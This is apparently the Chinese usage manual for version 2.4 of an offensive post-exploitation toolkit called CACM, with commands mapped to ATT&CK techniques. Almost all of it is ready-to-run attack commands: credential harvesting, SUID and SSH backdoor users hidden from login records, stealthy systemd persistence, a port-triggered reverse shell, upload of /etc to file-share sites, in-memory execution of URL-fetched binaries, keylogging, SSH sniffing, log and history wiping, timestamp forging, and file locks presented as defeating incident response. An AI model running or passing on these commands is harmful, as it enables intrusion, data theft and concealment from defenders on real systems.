# 快速开始
```shell
# 启动交互式 Shell
./CACM

# 单命令模式
./CACM -c "scan 10.0.0.0/24 -p 1-65535"

# 全局禁色（管道/重定向友好）
./CACM --no-color -c "searchall /etc"

# 查看所有命令
./CACM -h

# 查看某命令帮助
./CACM -c "scan -h"
```
# 全局选项

| 选项             | 说明                |
| -------------- | ----------------- |
| `-c <command>` | 执行单个命令而不进交互 Shell |
| `-h`, `--help` | 帮助                |
| `--no-color`   | 全局禁色（v2.4 新增）     |
# 🔍 信息收集
## `scan` — 端口扫描 + 服务/指纹识别 [T1046]

基于 gogo 引擎的高性能扫描器。

```shell
scan 10.0.0.0/24 -p 1-65535 -t 4000          # 全端口扫描，4000 线程
scan 192.168.1.1 -p top1000 --plugins all    # 启用所有插件
```
## `netspy` — 内网网段探测（ICMP/ARP/TCP/UDP）[T1018]
```shell
netspy scan 192.168.1.0/24                   # 自动选择最佳协议
netspy scan 10.0.0.0/16 --proto arp          # 指定 ARP
```
## `dns` / `rdns` — DNS 与反向 DNS [T1590.005]
```shell
dns google.com github.com                    # 并发解析多域名
rdns 8.8.8.8 1.1.1.1                         # 多公共数据库反查
```
## `sub` / `find_subdomains` — 子域枚举 [T1590.005] / [T1083]
```shell
sub example.com                              # 通过 crt.sh / ip.thc 枚举
find_subdomains target.com /var/log          # 在文件中提取
```

## `ws` — WhatServer 主机/服务器信息 [T1082]
```shell
ws 10.0.0.1:8080
```
## `xpty` — 列出所有 PTY / 登录用户 [T1033]
```shell
xpty
```
## `wfind` — 查找可写目录 [T1083]
```shell
wfind /var/www /home /tmp
```
## `np` — 中文友好的密钥/凭证扫描 [T1552.001]
```shell
np /var/www -o leak.txt                      # 试试 |less -R
```
## `searchall` — 全局秘密搜索 [T1552.001]
```shell
searchall / --workers 8 --env                          # 全盘 + 环境变量
searchall /home --suffix .php,.py,.go                  # 仅指定后缀
searchall /home --exclude-ext .log,.bak,.tmp           # 排除指定后缀（v2.4 新增）
searchall /etc --pattern 'API_[A-Z_]+=.*'              # 自定义正则
```
**v2.4 优先级**：`--exclude-ext` 黑名单 > `--suffix` / `--extensions` 白名单（与 rsync/find/gitignore 一致）。
## `lpe` — 内存运行 linPEAS / winPEAS [T1068]
```shell
lpe --unsafe --timeout=30                    # 不落盘
```
## `edr` — EDR / AV / 防火墙检测 [T1518.001]
```shell
edr scan -v -o edr.txt
```
## `jarspy` — Java 进程发现 + JAR 分析 [T1592.002]
```shell
jarspy --list -o /tmp/jars                   # 列出并提取所有 JAR
jarspy --decompile /tmp/jars/app.jar         # 反编译
jarspy heapdump 1234 -o heap.hprof           # 堆转储
```
## `xdocker` — Docker 容器/镜像发现与文件提取 [T1613]
```shell
xdocker list
xdocker search password                      # 容器内文件搜索
xdocker copy <id> /etc/shadow ./shadow
```

## `hgrep` — 人性化 grep（高亮输出）[T1083]
```shell
hgrep password /etc /home
```

---

# 🌐 网络隐蔽

## `xghostip` — Ghost IP（虚拟 IP + iptables）[T1090.003]
```shell
GHOST_IP=10.0.0.99 xghostip start
GHOST_NAME=kworker xghostip start            # 进程名伪装
xghostip stop
```

## `xbounce` — TCP 端口转发 [T1090.001]

```shell
xbounce 8888 10.0.0.5 22                     # 本机 8888 → 目标 22
```

## `portmux` — 端口复用（合法端口触发后门）[T1090.001]

```shell
portmux setup 80 1.2.3.4 4444 "X-CMD"        # 在 80 上检测特定头部触发反连
portmux clean
```

## `dl` — 多方式 URL 下载（含 GitHub 代理）[T1071.001]

```shell
dl https://x.com/f -g -o f                   # -g 启用 GitHub 加速
dl https://x.com/f --method openssl          # 强制使用 openssl
```

## `transfer` — 上传到分享服务 [T1041]

```shell
transfer dump.tar.gz --provider bashupload
transfer /etc --provider 0x0                 # 自动 tar
```

---

# 🔁 远程访问
## `xssh` — 静默 SSH（跳过 known_hosts、ControlMaster 复用）[T1021.004]

```shell
xssh user@host 'id'
xssh -i key.pem user@host                    # 复用同一通道，不留多次记录
```

## `xscp` — 静默 SCP [T1021.004]

```shell
xscp /tmp/x user@h:/tmp/
```

---
# 🛡️ 权限维持

## `xcron` — 计划任务持久化（systemd timer + crontab 双后端）🆕 [T1053.003]

v2.4 新增。自动选择最佳后端，支持随机时间扰动、单元名伪装。

```shell
xcron add /tmp/.r --random 30m                       # 默认 systemd timer，30m 内随机抖动
xcron add /tmp/.r --random 30m --bypass-crontab      # 仅 systemd（不写 crontab，更隐蔽）
xcron list
xcron remove 1                                       # 按编号删除
xcron remove 1,3,5                                   # 批量删除
```

## `ssh_backdoor` — SSH 后门用户全生命周期 [T1136.001]

```shell
ssh_backdoor add bk pass123                  # 添加用户
ssh_backdoor key bk ~/.ssh/id_rsa.pub        # 注入公钥
ssh_backdoor hide bk                         # 从 who/last 中隐藏
ssh_backdoor protect bk                      # immutable 保护配置
ssh_backdoor del bk                          # 清理
```

## `suidshell` — SUID Shell 后门 [T1548.001]

```shell
suidshell create --path=/tmp/.s --immutable
suidshell delete --path=/tmp/.s
```

---

# 👤 权限提升

## `xsu` — 静默切换用户（无 wtmp/utmp 记录）[T1134.001]

```shell
xsu mysql /bin/bash
xsu redis 'cat /etc/shadow'
```

（`lpe` / `suidshell` 见前文。）

---

# 🕵️ 隐蔽与反取证

## `hide` — 进程隐藏（基于 /proc bind mount）[T1055]

```shell
hide 1234                                    # 隐藏 PID
hide list                                    # 列出已隐藏
hide unhide 1234
```

## `xhome` — 隐蔽临时 HOME 目录 [T1564.001]

```shell
xhome create --path=/tmp/.h
xhome enter                                  # 进入隔离环境
```

## `xtmux` — 隐藏 tmux 会话 [T1564.001]

```shell
xtmux new -d -s hidden                       # 不在 list-sessions 显示
xtmux attach hidden
```

## `xlock` — 通用文件/目录加锁（chattr 包装）🆕 [T1222.002]

v2.4 新增。反应急响应：锁后即使 root 也无法删除/修改。

```shell
xlock /etc/passwd                            # 默认 chattr +i
xlock /var/log --recursive                   # 递归
xlock unlock /etc/passwd
xlock list                                   # 已锁列表
```

## `ctime` / `notime` / `notime_cp` — 时间戳修纂 [T1070.006]

```shell
ctime /tmp/a.txt                                     # ctime ← mtime
notime /etc/passwd touch /tmp/a                      # 以 /etc/passwd 的 mtime 创建
notime_cp /etc/passwd /tmp/p                         # 完整保留 a/m/c-time
```

## `shred` — 随机覆写后删除 [T1070.004]

```shell
shred /tmp/x.log
```

## `xlog` — 日志清理 [T1070.003]

```shell
xlog "192.168.1.99" /var/log/auth.log        # 删除含 IP 的行
xlog --journal "ssh"                         # 清理 systemd journal
```

## `historydel` — Shell 历史管理 [T1070.003]

```shell
historydel list
historydel search 'wget'
historydel delrange 10 20                    # 删除第 10-20 条
```

---

# 🧬 代码执行

## `memexec` — 内存加载执行 [T1055]

```shell
memexec /tmp/elf arg1 arg2                   # 路径
memexec https://x.com/elf arg                # URL（直接拉取）
cat elf | memexec - arg                      # stdin
```

---

# 📡 数据采集

## `tit` — 进程 stdin/stdout 嗅探（键盘记录）[T1056.001]

```shell
tit 12345 30                                 # 监听 PID 30 秒
```

## `sshmon` — SSH 流量监控/嗅探 [T1040]

```shell
sshmon start --encrypt                       # 加密保存
sshmon stop
sshmon dump --decrypt
```

---

# 🔐 密码学

## `enc` / `dec` — AES-256-GCM 加密/解密 [T1027]

密钥来自环境变量 `HS_TOKEN`。

```shell
HS_TOKEN=mysecret enc plain.txt out.enc
HS_TOKEN=mysecret dec out.enc plain.txt
echo "data" | HS_TOKEN=k enc - -             # 走 stdin/stdout
```

---

# 📥 工具下载

## `bin` — 静态二进制下载器 [T1105]

v2.4 新增 `P1soda v0.0.6`（Webshell 管理）与 `qscan v1.8.1`（资产扫描），三架构齐全。

```shell
bin list                                     # 查看所有可用工具
bin get qscan                                # 自动识别架构下载
bin get P1soda --arch linux/arm64
```

---

# 🧰 常用别名 (`common`)

```shell
ll        # ls -la
lt        # ls -lat（按时间排序）
ltr       # ls -latr
lss       # ls -lS（按大小）
lssr      # ls -lSr
psg X     # ps -ef | grep X | grep -v grep
lsg X     # ls | grep X
```

---

# 🆕 v2.4 新功能详解

## 1. `xcron` 计划任务持久化

- **双后端**：自动选择 systemd timer（优先）或 crontab。
- **随机扰动**：`--random 30m` 每次执行时间在窗口内随机化，规避 IDS 时序。
- **`--bypass-crontab`**：不写入 crontab，仅 systemd 后端，逃避 `crontab -l` 审计。
- **批量管理**：`xcron remove 1,3,5` 按列表编号删除。

## 2. `xlock` 文件加锁

- **chattr 包装**：默认 `+i` immutable，可叠加 `+a` append-only。
- **递归**：`--recursive` 整目录加锁。
- **白名单豁免**：通过 xattr 标记可信文件不锁。
- **反应急响应**：典型场景——给 webshell / 后门加锁，即使 root 也需先 `chattr -i` 才能删。

## 3. `searchall --exclude-ext` 排除后缀

- **优先级最高**：黑名单先生效，覆盖任何白名单（与 rsync/find/gitignore 一致）。
- **多形式**：`--exclude-ext` / `--exclude-extensions` / `-xe`，支持 `=value` 形式。
- **逗号分隔**：`.log,.bak,.tmp` 或 `log,bak,tmp` 都接受。

## 4. `bin` 模块新工具

- **P1soda v0.0.6**：Webshell 管理工具。
- **qscan v1.8.1**：高性能资产扫描器。
- 三架构：linux/amd64、linux/arm64、windows/amd64。

## 5. `--no-color` 全局开关

所有命令的 ANSI 染色一键关闭，便于 `| grep` / `| less` / 重定向到日志文件。

## 6. SIGINT 修复

Ctrl+C 中断不再残留输出/僵尸进程，所有长跑命令都会优雅退出。